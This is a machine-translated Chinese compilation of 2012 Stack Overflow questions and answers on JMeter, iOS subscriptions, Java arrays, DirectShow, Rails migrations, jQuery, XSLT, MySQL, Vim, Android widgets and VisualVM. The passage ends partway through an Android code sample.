这取决于 cookie 的设置方式。如果它是一个简单的 Set-Cookie 响应标头，那么您可以使用标准响应断言来验证这一点。但是，如果 cookie 通常是使用 javascript 设置或修改的，那么 JMeter 将不会执行此代码（它不是浏览器），您可能会更好地考虑使用更专注于功能测试的工具，例如 Selenium。

问题是，JMeter 是一个用来模拟大量浏览器向中央服务器发送请求以验证这台机器和它的朋友是否能够支持一定负载的工具；它并不是真正设计用于测试客户端功能。

# iphone - 因 iPhone 应用购买中不可更新订阅类型的新拒绝而受挫？

> ID：10862410
> 
> 赞同：4
> 
> 时间：2012-06-02T12:43:55.633
> 
> 标签：iphone, ios, in-app-purchase

我有一个 Iphone 应用程序，我正在尝试实现不可更新订阅。我这样做的方式是在购买后我将这些详细信息添加到用户帐户信息中。所以他可以在所有设备上获取它。我有一个登录在我的应用程序开始时。在将收据数据与用户帐户相关联后，我从收据数据中的购买日期找出服务器中的到期日期，通过使用该信息，我再次向我的用户显示购买按钮.但苹果拒绝它的原因

> 11.6：使用 IAP 的内容订阅必须至少持续 7 天，并且用户可以从他们的所有 iOS 设备上使用
> 
> 17.2：要求用户分享个人信息（例如电子邮件地址和出生日期）才能正常运行的应用程序将被拒绝

任何人都可以知道实施不可再生订阅的确切机制吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-03T21:55:36.940

从您的描述看来，当他们启动您的应用程序时您的登录是**强制性**的。苹果禁止这样做。他们坚持认为登录是**可选**的，但它**必须**仍然可供想要使用它的每个人使用（当使用非续订订阅时）。

我在我的应用程序上所做的是，在我显示用户购买的订阅级别的位置旁边，我有一个按钮，上面写着`Save your account...`。当他们点击它时，它会向他们描述，如果他们创建了一个电子邮件和密码，他们就可以在所有设备上共享他们的订阅，并且如果他们的 iPhone 丢失或被盗**，他们可以恢复他们的帐户。**你想激励用户这样做，因为对他们来说更好的体验对你来说意味着更好的体验。你甚至可以为他们提供额外的福利，比如如果他们创建了一个帐户，可以免费使用 2 周。而且由于您使用的是非续订订阅，因此您有权执行此操作，因为您正在计算自己的到期日期，而不是让应用商店为您计算。

# iphone - MKPinAnnotationView：动画引脚颜色变化

> ID：10862411
> 
> 赞同：1
> 
> 时间：2012-06-02T12:44:12.767
> 
> 标签：iphone, objective-c, ios, xcode, mkmapview

我想通过动画它们的引脚颜色使一些引脚从其他引脚中脱颖而出。这可能吗？

谢谢

# php - FQL 如何将 photo_src 表链接到其他表

> ID：10862427
> 
> 赞同：0
> 
> 时间：2012-06-02T12:46:42.580
> 
> 标签：php, facebook-fql

我试图从 photo_scr 表中获取照片的来源

提供的示例有效

从 photo_src 中选择 src、宽度、高度，其中 photo_id = 10150931418786729

但是，我不知道 photo_id 是什么，也不知道从哪里得到它。

我尝试了其他表中的 pid，但它不起作用，我尝试了 oid，但它也不起作用。其他表都没有 photo_id，它们都有 pid 或 object_id。

那么如何查询才能找到 photo_ids 呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:28:50.047

它是“照片”表中的 object_id (https://developers.facebook.com/docs/reference/fql/photo/)

# java - Java：对象数组；本地实例和类级别实例有什么区别？

> ID：10862428
> 
> 赞同：-3
> 
> 时间：2012-06-02T12:46:42.817
> 
> 标签：java, arrays, object, initialization, default-value

就初始/默认/未初始化值而言...
...数组对象是否已初始化（在类和本地级别）？

在一些 SCJP 笔记中阅读它：

> 无论数组是声明为实例还是局部变量，数组元素都会被赋予其默认值。
> 
> 但是，如果在本地声明数组“对象”，则不会对其进行初始化。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T12:51:56.787

作为引用类型的类成员的初始值为 null。

作为引用类型的局部变量被认为是单元化的，需要明确分配 null 或其他内容，否则代码将无法编译。

尝试测试这个例子，看看会发生什么：

```
class Test {
    private Object[] member;

    public void foo() {
        member.toString(); // NullPointerException
        Object[] local;
        local.toString(); // won't compile: The local variable local may not have been initialized
    }
} 
```

对象数组遵循相同的规则，因为它们本身就是引用。

现在，这是针对数组本身的。在谈到**array 的实际元素时**，无论您在哪里声明它们，它们默认为 null：

```
class Test {
    private Object[] member = new Object[10];

    public void foo() {
        member[0].toString(); // NullPointerException
        Object[] local = new Object[10];
        local[0].toString(); // NullPointerException
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-02T12:50:05.307

未初始化的对象总是`null`.

```
Object[] myArray;
//myArray == null

myArray = new Object[1];
//myArray[0] == null 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-02T12:49:55.867

声明为字段的数组初始化为 null，就像每个非原始实例变量一样。声明为局部变量的数组未初始化，与其他所有局部变量一样。

一旦初始化为一个新数组，它们的每个元素都包含 null。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-02T13:09:46.530

1`.In JAVA local variable have to intitialized before using it.`

```
2\. String s[] = new String[2];
Here s[0] and s[1] both contains NULL value and initialize s[0] and s[1] as:
s[0] = new String();
s[1] = new String(); 
```

# visual-c++ - 如何在 Directshow 中实现 IPinFlowControl 接口

> ID：10862435
> 
> 赞同：1
> 
> 时间：2012-06-02T12:47:52.810
> 
> 标签：visual-c++, directshow

我想实现`IPinFlowControl`接口，它有一个方法块。

我试过下面的代码，

```
Mux::NonDelegatingQueryInterface(REFIID iid, void** ppv)
{
   if(iid==IID_IPinFlowControl)
    {
    return GetInterface((IPinFlowControl*) this, ppv);
    }

    return CBaseFilter::NonDelegatingQueryInterface(iid, ppv);
}

STDMETHODIMP Mux::Block(DWORD dwBlockFlags,HANDLE hEvent)
{
    return S_OK;
} 
```

并注册上面的过滤器。

现在在代码中我创建了上述过滤器的实例，连接它的输出引脚然后尝试

```
IPin *pMuxOut2 = NULL;
hr = FindUnconnectedPin(mux,PINDIR_OUTPUT,&pMuxOut2);

IPinFlowControl *pinFlowControl=NULL;

hr=pMuxOut2->QueryInterface(IID_IPinFlowControl,(void**)&pinFlowControl); 
```

但是我在 pinFlowControl 中得到了 E_NonInterface，

还请帮助我正确实施阻止和解除阻止输出的阻止方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T16:24:36.520

如果你打算`IPinFlowControl`在你的过滤器上实现，你应该看看[`CDynamicOutputPin`](http://msdn.microsoft.com/en-us/library/windows/desktop/dd374458%28v=vs.85%29.aspx)BaseClasses 提供的类。

[Windows SDK 中的Synth Filter Sample](http://msdn.microsoft.com/en-us/library/windows/desktop/dd407178%28v=vs.85%29.aspx)为您提供了从此类派生的示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T15:15:39.397

看起来您在过滤器上实现了接口，但在引脚上查询该接口。

如果要在引脚上创建该接口，则需要创建该接口，并且必须创建一个使用该引脚实现的过滤器。

# ruby-on-rails - Rails - reset_column_information 不起作用

> ID：10862438
> 
> 赞同：0
> 
> 时间：2012-06-02T12:49:37.163
> 
> 标签：ruby-on-rails, database-migration, undefined-reference

我在 Rails 迁移中将一列（“old_name”）重命名为“new_name”）并将另一列（“column2”）从整数转换为布尔值：

```
def up
  rename_column :my_models, :old_name, :new_name unless column_exists?(:my_models, :new_name)
  ...........
  if column_exists?(:my_models, :column2) && !column_exists?(:my_models, :column2_num) && MyModel.columns_hash['column2'].type==:integer
    rename_column :my_models, :column2, :column2_num
    add_column :my_models, :column2, :boolean, :null => false, :default => true

    MyModel.reset_column_information

    MyModel.all.each do |item|
      item.column2 = (item.column2_num!=0)
      item.save!
    end
    remove_column :my_models, :column2_num
  end
  ...........
end 
```

rake db:migrate 结果：

```
undefined method `old_name' for #<MyModel:0x4ff4238> 
```

“保存！”中出现错误！方法。

我也试过：

```
MyModel.connection.schema_cache.clear!
MyModel.reset_column_information 
```

id 也不起作用。

值得一提的是，我已经应用了此迁移的先前版本一次，并且在回滚后（“向下”方法为空）我试图再次应用它。因此，数据库模式当前不包含“old_name”，因为它没有物理还原。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-23T13:27:09.600

我最近遇到了同样的问题，我发现不是 Rails 导致了问题，而是数据库中的更新触发器仍在引用旧的列名。

删除了触发器的那一部分，迁移就完成了。

# javascript - jQuery 加载函数链接不起作用

> ID：10862446
> 
> 赞同：0
> 
> 时间：2012-06-02T12:50:39.597
> 
> 标签：javascript, jquery

嗨，我正在尝试创建一个电子商务网站的界面作为个人项目。作为网络开发的初学者，我似乎遇到了一个我不明白的问题。我正在使用 jQuery 的加载功能来改变点击时 2 个 div 的内容。这是我的代码的 HTML：

```
<ul id="title">
                <li><h2 class="title"><a href="" class="selected">Configureaza</a></h2></li>
                <li><h2 class="title"><a href="">Personalizeaza</a></h2></li>
                <li><h2 class="title"><a href="">Adonuri</a></h2></li>
                <li><h2 class="title"><a href="">Verifica</a></h2></li>
</ul>
<div id="tot">
        <div id="configureaza">
              <div id="stuff">
                    <img src="img/windows.jpg"/>
                           <div id="select">
                                <h2>Selecteaza Produsul Microsoft</h2>
                                <form>
                                    <ul>
                                        <li><input type="checkbox" value="Windows Vista"/>Windows Vista<span>+320 lei</span></li>
                                        <li><input type="checkbox" value="Windows 7"/>Windows 7<span>+440 lei</span></li>
                                        <li><input type="checkbox" value="Microsoft Office"/>Microsoft Office<span>+220 lei</span></li>       
                                    </ul>
                                </form>

                            </div>
                        </div>
                        <ul id="links">
                            <li><a href=""><img src="img/msvista_on.gif" title="Sistem de Operare"/></a></li>
                            <li><a href=""><img src="img/placadebaza.png" title="Placa de Baza"/></a></li>
                            <li><a href=""><img src="img/procesor.png" title="Procesor"/></a></li>
                            <li><a href=""><img src="img/aw_optical_on.gif" title="Unitate Optica"/></a></li>
                            <li><a href=""><img src="img/hd.jpg" title="Hard-Disk"/></a></li> 
                            <li><a href=""><img src="img/vs4.jpg" title="Rami"/></a></li>
                            <li><a href=""><img src="img/vc.jpg" title="Placa Video"/></a></li>
                        </ul>
                    </div>

            </div> 
```

jQuery：

```
 $(document).ready(function(){
            $('img[title="Sistem de Operare"]').click(function(e){
                e.preventDefault();
                $('div#stuff').load('win.html');

            })
            $('img[title="Placa de Baza"]').click(function(e){
                 e.preventDefault();
                $('div#stuff').load('motherboard.html');

            })

            $("ul#title a").click(function(e){
                 e.preventDefault();
                var link = $(this).text();
                if(link === "Configureaza"){

                    $('div#tot').load('Configureaza.html');

                }else if(link === "Personalizeaza"){

                     $('div#tot').load('Personalizeaza.html');

                }else if(link === "Adonuri"){

                    $('div#tot').load('Addons.html');

                }else{

                     $('div#tot').load('Verifica.html');

                }
                $('ul#title a').removeClass('selected');
                $(this).addClass('selected');     

            })

        }) 
```

我只发布了来自 ul#links 的前 2 个链接的代码，因为其他代码类似。好吧，当我第一次加载页面并单击例如 $('img[title="Sistem de Operare"]')加载功能正常工作，它加载那里指定的元素。但是，如果我单击 div#tot 中的任何链接，然后返回主页，则其他链接不再起作用，并且我注意到链接上添加了 # beinng。我该如何解决这个问题？

我不明白的另一个问题是，当我尝试转到我有页面的文件夹并手动打开它时，所有链接都不会从一开始就起作用。但是如果我从 netbeans 打开它们，它们都可以工作。什么我做错了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:37:36.083

click() 在您的页面首次加载时运行一次。一旦您使用 load() 添加新元素，即使您与 click() 一起使用的选择器与这些新元素匹配，该选择器也不会再次运行，并且 click() 函数也不会在它们上运行。

在旧版本的 jQuery 中，我们曾经为此使用称为“live()”的东西，但现在首选的方法是使用“on()”。所以这：

```
$("ul#title a").click(function(e){ 
```

应该变成：

```
$(document).on("click", "ul#title a", function(e){ 
```

这就是说，如果事件的目标与“ul#title a”选择器匹配，则单击文档时，继续运行单击处理程序。由于文档从一开始就存在，并且处理程序位于文档上，因此无论何时将“ul#title a”元素添加到页面中，它们都将始终有效。

# java - 一类任意维度的数学向量

> ID：10862447
> 
> 赞同：3
> 
> 时间：2012-06-02T12:50:57.267
> 
> 标签：java, math, vectormath

我想为数学向量（保存实数）编写一个类。我认为无论向量的维度如何，向量操作都几乎相同，所以我不想写像`Vector2D`, `Vector3D`, `Vector4D`, ... 这样的类，我只想写一个`Vector`类。

现在的问题是我不能将 2D 矢量与 4D 相乘，所以我想到了 field `dimension`。但现在我必须检查每一次手术，所以我问自己是否可以做得更好。这是我想到的泛型。但话又说回来，我必须做类似的事情`Vector<? extends Dimension>`，其中`Dimension`​​只是 的一个基类`Dimension.One`，`Dimension.Two`等等，这意味着我必须为`Dimension`我想在其中使用 vectos 的每个维度编写一个类。

所以我的问题：

有没有一种方法可以为任意维度的向量编写一个类，而无需在运行时检查维度？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:58:05.763

如果我正确理解您的问题，那么答案是您不能两者兼得。要么使用类型系统来确保正确的维度，然后最终导致显式类型的激增（泛型对您没有帮助），要么使用状态来跟踪维度并在每次执行操作时执行动态检查。由于向量的“维度”是它包含多少个元素，这将在底层数据结构中以某种方式表示。例如，如果您使用列表将值存储在向量中，则列表知道它包含多少元素。所以做一个简单的运行时检查很便宜，当尺寸不匹配时你可以抛出异常。该解决方案比基于类型的解决方案更灵活且易于编程。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-02T12:59:34.033

您可以在类中嵌入`Dimension`一个方法，该方法执行检查并`Runtime Exception`在向量不兼容时抛出 a。然后让每个方法都`Dimension`调用这个方法。现在，*使用*该类的代码`Dimension`不会被检查乱七八糟。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T12:57:59.350

你可以用一些有趣的泛型编写一个 Vector 类

```
public static class Vector<V extends Vector<V>>{
    protected double[] components;
    public final int dimensions;
    private Class<V> klass;

    protected Vector(int d, Class<V> klass) {
        this.klass = klass;
        this.components = new double[d];
    }

    public double get(int x) { return components[x] }
    protected void set(int x, double d) { components[x] = d }

    public V clone() {
        try {
            V c = klass.newInstance();
            c.components = this.components.clone();
            return c;
        }
        catch(InstantiationException e1) {}
        catch(IllegalAccessException e2) {}
        return null;
    }

    public V add(V that) {
        V sum = this.clone();
        for(int i = 0; i < dimensions; i++)
            sum.components[i] += that.components[i];
        return sum;
    }

} 
```

然后推导出每个案例：

```
public static class Vector2D extends Vector<Vector2D>{
    public Vector2D() { 
        super(2, Vector2D.class);
    }
    public Vector2D(double x, double y) { 
        this();
        set(0, x);
        set(1, y);
    }
}
public static class Vector3D extends Vector<Vector3D>{
    public Vector3D() { 
        super(3, Vector3D.class);
    }
    public Vector3D(double x, double y, double z) { 
        this();
        set(0, x);
        set(1, y);
        set(2, z);
    }
}
public static class Vector4D extends Vector<Vector4D>{
    public Vector4D() { 
        super(4, Vector4D.class);
    }
    public Vector4D(double w, double x, double y, double z) { 
        this();
        set(0, w);
        set(1, x);
        set(2, y);
        set(3, z);
    }
} 
```

毕竟，有一些特殊情况——例如，叉积只存在于 3 维和 7 维中。每个都有一个实现可以解决这个问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-02T15:34:12.273

为了弄清楚我为什么要使用泛型（它有效，这就是我将其发布为答案的原因）：

维度.java：

```
public class Dimension {
    class ONE extends Dimension {}
    class TWO extends Dimension {}
    class THREE extends Dimension {}
    // [...]
} 
```

向量.java：

```
public class Vector<D extends Dimension> {
    private double[] elements;

    public Vector(double _elmts) {
        elements = _elmts;
    }

    public void add(Vector<D> v) { /*...*/ }
    public void subtract(Vector<D> v) { /*...*/ }
} 
```

但正如我的问题中提到的，我必须创建几个类，这是我首先要防止的。而且还比较丑。`elements`除了信任用户之外，没有其他方法可以确保具有正确的维度。

我想这与埃里克的回答非常相似。

# objective-c - 如何创建交互式 quicklook 插件缩略图？

> ID：10862452
> 
> 赞同：3
> 
> 时间：2012-06-02T12:51:48.680
> 
> 标签：objective-c, macos, quicklook

我想为文件类型创建交互式缩略图，例如 Mac OS X 附带的用于音频文件或 PDF 的缩略图。

我知道这是可能的，但它是否涉及未记录的私有 API？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T22:05:26.067

确实没有公共 API。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-15T23:37:37.097

制作交互式 QuickLook 插件的唯一“受支持”方式是制作 HTML 页面。请注意，您不能使用浏览器插件（如 Flash），也不能从互联网上提取数据。

# xml - xml 样式表中应用模板的语法

> ID：10862453
> 
> 赞同：1
> 
> 时间：2012-06-02T12:51:55.743
> 
> 标签：xml, stylesheet

以下代码中有一个名为“this-article”的变量。

一般我们都是这样使用“xsl:apply-templates”的

```
<xsl:apply-templates select="somenode"/> 
```

“somenode”表示子节点。

* * *

但是在这个变量中，apply-template 是这样写的。它很奇怪。

```
 <xsl:apply-templates select="." mode="id"/> 
```

如果您能解释它的含义，我将不胜感激。

```
<!-- ============================================================= -->
<!--  "make-article" for the document architecture                 -->
<!-- ============================================================= -->

  <xsl:template name="make-article">
    <!-- Generates a series of (flattened) divs for contents of any
           article, sub-article or response -->

    <!-- variable to be used in div id's to keep them unique -->
    <xsl:variable name="this-article">
      <xsl:apply-templates select="." mode="id"/>
    </xsl:variable>

    <div id="{$this-article}-front" class="front">
      <xsl:apply-templates select="front | front-stub"/>
    </div>

    <!-- body -->
    <xsl:for-each select="body">
      <div id="{$this-article}-body" class="body">
        <xsl:apply-templates/>
      </div>
    </xsl:for-each>

    <xsl:if test="back | $loose-footnotes">
      <!-- $loose-footnotes is defined below as any footnotes outside
           front matter or fn-group -->
      <div id="{$this-article}-back" class="back">
        <xsl:call-template name="make-back"/>
      </div>
    </xsl:if>

    <xsl:for-each select="floats-group">
      <div id="{$this-article}-floats" class="back">
        <xsl:call-template name="main-title">
          <xsl:with-param name="contents">
            <span class="generated">Floating objects</span>
          </xsl:with-param>
        </xsl:call-template>
        <xsl:apply-templates/>
      </div>
    </xsl:for-each>

    <!-- more metadata goes in the footer -->
    <div id="{$this-article}-footer" class="footer">
      <xsl:call-template name="footer-metadata"/>
      <xsl:call-template name="footer-branding"/>
    </div>

    <!-- sub-article or response (recursively calls
             this template) -->
    <xsl:apply-templates select="sub-article | response"/>

  </xsl:template> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T17:51:18.047

我不确切知道这段代码在做什么，但它是一种足够常见的设计模式。假设您想根据元素的“重要性”来决定是否显示（或省略）元素。那么你可能有一套计算元素重要性的规则：

```
<xsl:template match="p" mode="importance">high</xsl:template>

<xsl:template match="span[@class='x']" mode="importance">medium</xsl:template>

<xsl:template match="emph[@class='x']" mode="importance">low</xsl:template> 
```

要计算当前元素的重要性，您可以这样做

```
<xsl:variable name="importance">
  <xsl:apply-templates select="." mode="importance"/>
</xsl:variable> 
```

这类代码通常由完全掌握模板规则的价值的人编写，以支持开发可扩展、基于规则、可重用和多态的代码。阅读这样的代码并从中学习是非常值得的。

# mysql - 如何以 DRY 方式编写 MYSQL 查询

> ID：10862456
> 
> 赞同：2
> 
> 时间：2012-06-02T12:52:16.447
> 
> 标签：mysql, dry

我有一个这样的查询，它查看大量不同的 URL，并按主机名对它们进行分组。它非常丑陋，但似乎足够快可以使用。

我如何编写它以便以更简洁的方式编写丑陋的子字符串（它抓住了域的第一部分）？我正在从一系列社交媒体网站生成查询，因此那里可能会有更多网站。

```
SELECT substring(r.name, 8, locate("/",substring(r.name FROM 8))-1) AS referer_domain,
       count(USER) AS hits,
       r.id
FROM core c,
     referer r
WHERE c.site_url = 12
    AND r.name LIKE '%/%'
    AND c.referer = r.id
    AND (substring(r.name, 8, locate("/",substring(r.name FROM 8))-1) = "www.delicious.com"
    OR substring(r.name, 8, locate("/",substring(r.name FROM 8))-1) = "www.facebook.com"
    OR substring(r.name, 8, locate("/",substring(r.name FROM 8))-1) = "m.facebook.com"
    OR substring(r.name, 8, locate("/",substring(r.name FROM 8))-1) = "www.reddit.com"
    OR substring(r.name, 8, locate("/",substring(r.name FROM 8))-1) = "twitter.com"
    OR substring(r.name, 8, locate("/",substring(r.name FROM 8))-1) = "news.ycombinator.com"
GROUP BY substring(r.name, 8, locate("/",substring(r.name FROM 8))-1)
ORDER BY hits DESC 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:01:08.867

在您的情况下，您已经创建了一个输出列 referer_domain，您可以为 GROUP BY 引用它。

为了在 WHERE 子句中使用它，尽管您需要一个视图。

```
CREATE VIEW ref_domain_view AS SELECT *,substring(name, 8, locate("/",substring(name FROM 8))-1) as referer_domain FROM referer;

SELECT r.referer_domain,
   count(USER) AS hits,
   r.id
FROM core c,
 ref_domain_view r
WHERE c.site_url = 12
AND r.name LIKE '%/%'
AND c.referer = r.id
AND referer_domain = "www.delicious.com"
OR referer_domain = "www.facebook.com"
OR referer_domain = "m.facebook.com"
OR referer_domain = "www.reddit.com"
OR referer_domain = "twitter.com"
OR referer_domain = "news.ycombinator.com"
GROUP BY referer_domain
ORDER BY hits DESC 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:56:44.110

你可以使用[`CREATE FUNCTION`](http://dev.mysql.com/doc/refman/5.0/en/create-procedure.html)它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T13:12:05.903

一种方法是编写一个执行字符串提取的[用户定义函数 (UDF)](http://dev.mysql.com/doc/refman/5.6/en/create-function-udf.html)。UDF 很快，但写起来更痛苦。另一种选择是编写[存储函数](http://docs.oracle.com/cd/E17952_01/refman-5.1-en/create-procedure.html)，这是一种更易于编写且更符合 SQL 语法的存储过程。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-02T13:33:19.327

虽然以上两个答案都有很好的意义，但我不得不问你一些事情。

你真的需要所有的子字符串函数调用吗？

你有没有尝试过这样的事情：

```
SELECT substring(r.name, 8, locate("/",substring(r.name FROM 8))-1) AS referer_domain,
   count(USER) AS hits,
   r.id
FROM core c,
 referer r
WHERE c.site_url = 12
AND r.name LIKE '%/%'
AND c.referer = r.id
AND r.name    = "http://www.delicious.com"
OR r.name     = "http://www.facebook.com"
OR r.name     = "http://m.facebook.com"
OR r.name     = "http://www.reddit.com"
OR r.name     = "http://twitter.com"
OR r.name     = "http://news.ycombinator.com"
GROUP BY substring(r.name, 8, locate("/",substring(r.name FROM 8))-1)
ORDER BY hits DESC 
```

上述查询的唯一问题是，如果您需要更多域来跟踪，则需要更改查询。如果您将域放入表中并加入该表，您可能会完全摆脱子字符串，并且永远不必更改查询。

# vim - 做什么 = 在 Vim 中的意思

> ID：10862457
> 
> 赞同：53
> 
> 时间：2012-06-02T12:52:39.803
> 
> 标签：vim

我遇到了一些我不明白的语法用法：

第一个在 :help 映射中：

```
:map <F2> a<C-R>=strftime("%c")<CR><Esc> 
```

这个序列确实将 strftime 的值插入缓冲区，尽管我不明白如何。换成不同的东西会破坏它。

另一个是在 wiki[页面上](http://vim.wikia.com/wiki/Improve_completion_popup_menu)，它描述了如何使omnicompletion 弹出菜单正常工作：

```
inoremap <silent> <Esc> <C-r>=pumvisible() ? "\<C-y>" : "\<Esc>"<CR> 
```

这里也一样。

任何人都可以解释这个“ `<C-r>=`”的东西是如何工作的吗？...

* * *

## 回答 #1

> 赞同：71
> 
> 时间：2012-06-02T14:32:13.747

`<C-r>=`, 或`Ctrl`+`R``=`用于在光标处插入表达式的结果。

在编辑 CSS 以插入值时，我经常使用它：

```
width: <C-r>=147-33<CR>px;
width: 114px; 
```

***编辑***

`<C-r>`, 不带`=`, 允许您在保持*插入*模式时在光标处插入任何寄存器的内容：`<C-r>+`例如，插入我的系统剪贴板的内容。见`:help i_ctrl_r`。

`=`是“表达式寄存器”。见`:help "=`。

***结束编辑***

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2012-06-02T12:55:53.547

`<C-r>`就像在键盘上做 CTRL+R 一样。`<CR>`就像点击进入。您可以通过执行找到完整列表`:help key-notation`。

# android - 在 AppWidget 中制作切换按钮

> ID：10862460
> 
> 赞同：0
> 
> 时间：2012-06-02T12:53:03.377
> 
> 标签：android, android-widget

我正在尝试在 appwidget 中制作一个简单的切换按钮。为此，我想保存当前状态，并且为此使用共享首选项..但我仍然遇到麻烦。

布尔值 isRecordting 始终为 false

这是关于接收的：

```
@Override
    public void onReceive(Context context, Intent intent)
    {
        switchToggle(context, intent);

        super.onReceive(context, intent);
    }

    private void switchToggle(Context context, Intent intent)
    {
        SharedPreferences prefs = context.getSharedPreferences(TAG, Context.MODE_PRIVATE);
        isRecording = prefs.getBoolean(IS_RECORDING, false);
        RemoteViews remoteViews = new RemoteViews(context.getPackageName(),R.layout.widget);
        Log.d(TAG,"Toggle State: " + isRecording);

        if (isRecording)
        {
            remoteViews.setImageViewResource(R.id.btnRecordToggle, R.drawable.record_button_enabled);
        }
        else
        {
            remoteViews.setImageViewResource(R.id.btnRecordToggle, R.drawable.record_button);
        }

        ComponentName componentName = new ComponentName(context, RecorderWidget.class); 
        AppWidgetManager.getInstance(context).updateAppWidget(componentName, remoteViews);
        isRecording = !isRecording;
        prefs.edit().putBoolean(IS_RECORDING, isRecording);
    } 
```

这是更新中：

```
@Override
    public void onUpdate(Context context, AppWidgetManager appWidgetManager, int[] appWidgetIds)
    {
        // TODO Auto-generated method stub
        super.onUpdate(context, appWidgetManager, appWidgetIds);
        for (int widgetId : appWidgetIds) 
        {
            RemoteViews remoteViews = new RemoteViews(context.getPackageName(),R.layout.widget);

            // Register an onClickListener
            Intent intent = new Intent(context, RecorderWidget.class);
            intent.setAction(ACTION_START_RECORDING);

            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
            remoteViews.setOnClickPendingIntent(R.id.btnRecordToggle, pendingIntent);

            appWidgetManager.updateAppWidget(widgetId, remoteViews);
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:02:01.623

发现问题了！！！..

我需要向我的 Sherde 首选项支付费用……对不起，大家都知道了……

这是固定代码：

```
 private void switchToggle(Context context, Intent intent)
        {
            SharedPreferences prefs = context.getSharedPreferences(TAG, Context.MODE_PRIVATE);
            isRecording = prefs.getBoolean(IS_RECORDING, false);
            RemoteViews remoteViews = new RemoteViews(context.getPackageName(),R.layout.widget);
            Log.d(TAG,"Toggle State: " + isRecording);

            if (isRecording)
            {
                remoteViews.setImageViewResource(R.id.btnRecordToggle, R.drawable.record_button_enabled);
            }
            else
            {
                remoteViews.setImageViewResource(R.id.btnRecordToggle, R.drawable.record_button);
            }

            ComponentName componentName = new ComponentName(context, LifeRecorderWidget.class); 
            AppWidgetManager.getInstance(context).updateAppWidget(componentName, remoteViews);
            isRecording = !isRecording;

           //THIS IS THE FIX
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean(IS_RECORDING, isRecording);
            editor.commit();
        } 
```

# java - VisualVM socket.read

> ID：10862464
> 
> 赞同：10
> 
> 时间：2012-06-02T12:53:48.270
> 
> 标签：java, profiling, visualvm

所以我正在使用 VisualVM 分析我的应用程序。

我遇到了一个关于我的 MySQL 交互的热点。我的第一个想法是热点显示我的应用程序在 IO 之后等待的时间。但是在分析报告中，VisualVM 有两列“时间”和“时间（cpu）”。也许这个词被错误地使用了，但我假设 self-time (cpu) 列不包括 IO 时间。经过更多调试，我们得出结论，假设是错误的并且显示 IO 时间，因为热点位于 MySQL 驱动程序的 java.net.SocketInputStream.read() 和其他不应该消耗任何 cpu 的 IO 东西上。

所以，我的问题是为什么 visualvm 将 SocketInputStream.read() 报告为 cpu 时间？

![截图](../Images/abebd3868b9897a07e1f29a66a3ceb91.png "截屏")

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-08T13:18:59.137

在监视线程活动时，本机调用始终处于 RUNNABLE 状态，这可能是因为 JVM 无法知道本机调用是在休眠还是实际在做某事。因此，在 RUNNABLE 状态下经过的时间算作 CPU 时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T20:29:57.460

[这个很长的线程](https://forums.oracle.com/forums/thread.jspa?threadID=1145602&start=0&tstart=0)声称小写入可能会导致问题。值得一读，但我不知道你能做些什么。你能做什么？您可以确保您没有使用小的[fetch size](http://webmoli.com/2009/02/01/jdbc-performance-tuning-with-optimal-fetch-size/)。这不会给你小写，但小读会导致同样的问题。您可以为客户端或服务器尝试不同的平台。[此错误](http://bugs.mysql.com/bug.php?id=24995)中有一条评论如下：

“在 Solaris 和 Linux 之间填充 I/O 缓冲区的速度（以及对 ReadAheadInputStream.fill() 的调用次数）方面，我们已经看到了*截然不同*的行为，因为它读取可用的内容，除非需要，否则它不会阻塞阅读比可用的更多）。”

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-02T13:44:17.470

SocketInputStream.read() 阻塞，直到另一端有可用数据。因此，您的数据库可能响应缓慢。

# android - Android：在画布内滚动位图

> ID：10862465
> 
> 赞同：3
> 
> 时间：2012-06-02T12:54:09.797
> 
> 标签：android, bitmap, android-canvas

我想创建一个视图，该视图将在画布内包含一个大位图（大于屏幕）。这样用户就可以滚动`Bitmap`并在其上绘制手指画。我正在关注`FingerPaint`Android API Demos 中的代码。

但我无法`Bitmap`使用`Canvas`. 增加位图的大小似乎不起作用。

我尝试在 a 中添加视图类，`ScrollView`但视图`onDraw()`没有被调用，我得到一个空白屏幕。

请帮我解决一下这个。谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T13:10:08.223

尝试制作这样的自定义视图：

```
public class ScrollableImage extends View {
    private Bitmap bmLargeImage; // bitmap large enough to be scrolled
    private Rect displayRect = null; // rect we display to
    private Rect scrollRect = null; // rect we scroll over our bitmap with
    private int scrollRectX = 0; // current left location of scroll rect
    private int scrollRectY = 0; // current top location of scroll rect
    private float scrollByX = 0; // x amount to scroll by
    private float scrollByY = 0; // y amount to scroll by

    private int width, height;

    private Paint background;

    public ScrollableImage(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    public ScrollableImage(Context context, AttributeSet attrs, int defStyle) {
